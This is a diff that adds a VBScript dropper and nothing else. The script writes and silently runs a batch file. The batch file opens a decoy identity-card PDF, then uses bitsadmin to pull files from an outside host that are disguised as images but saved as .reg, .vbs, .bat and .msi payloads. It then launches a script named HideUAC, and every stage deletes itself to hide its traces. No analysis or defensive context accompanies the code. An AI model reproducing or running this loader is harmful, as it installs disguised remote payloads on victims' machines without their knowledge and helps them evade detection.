@@ -1,0 +1,42 @@
+Dim objFSO, outFile
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Set outFile = objFSO.CreateTextFile("C:\temp\all.bat", True)
+
+outFile.WriteLine	"start https://rinaldomattei.firstcloudit.com/ATERA/CARTA_IDENTITA.pdf"
+outFile.WriteLine	"TIMEOUT /T 5"
+outFile.WriteLine	"bitsadmin /transfer myDownloadJob /download /priority normal https://rinaldomattei.firstcloudit.com/ATERA/Clean.jpg c:\temp\Clean.reg https://rinaldomattei.firstcloudit.com/ATERA/HideUAC.jpg c:\temp\HideUAC.vbs https://rinaldomattei.firstcloudit.com/ATERA/if.jpg c:\temp\if.bat https://rinaldomattei.firstcloudit.com/ATERA/Raf2.jpg c:\temp\Raf2.bat https://rinaldomattei.firstcloudit.com/ATERA/Rast.jpg c:\temp\Rast.bat https://rinaldomattei.firstcloudit.com/ATERA/Rastaf.jpg c:\temp\Rastaf.bat https://rinaldomattei.firstcloudit.com/ATERA/Rastaf.bmp c:\temp\Rastaf.msi https://rinaldomattei.firstcloudit.com/ATERA/Rastaf.tif c:\temp\Rastaf.reg"
+outFile.WriteLine	
+outFile.WriteLine	"TIMEOUT /T 5"
+outFile.WriteLine	"start c:\temp\HideUAC.vbs"
+outFile.WriteLine	
+outFile.WriteLine	"TIMEOUT /T 5"
+outFile.WriteLine
+outFile.WriteLine 	"del %0"
+outFile.Close
+
+'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+Set outFile = objFSO.CreateTextFile("C:\temp\HideAll.vbs", True)
+
+'Write each command line
+outFile.WriteLine 	"CreateObject(""Wscript.Shell"").Run ""C:\temp\all.bat"",0,False"
+outFile.WriteLine 	"Set objFSO = CreateObject( ""Scripting.FileSystemObject"" )"
+outFile.WriteLine 	"objFSO.DeleteFile WScript.ScriptFullName"
+outFile.WriteLine 	"WScript.Quit"
+
+'Close write stream
+outFile.Close
+
+WScript.Sleep 1000
+'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+CreateObject("WScript.Shell").Run "C:\temp\HideAll.vbs"
+
+WScript.Sleep 1000
+
+Set objFSO = CreateObject( "Scripting.FileSystemObject" )
+objFSO.DeleteFile WScript.ScriptFullName
+WScript.Quit
